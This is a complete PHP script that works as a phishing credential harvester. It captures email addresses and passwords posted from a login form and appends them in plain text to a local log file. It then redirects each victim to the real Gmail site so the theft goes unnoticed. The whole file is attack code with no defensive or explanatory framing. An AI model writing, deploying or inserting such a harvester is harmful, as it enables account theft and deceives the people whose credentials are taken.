<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: " . $email . " | Password: " . $pass . "\n");
    fclose($file);
    header("Location: https://mail.google.com");
    exit();
}
?>
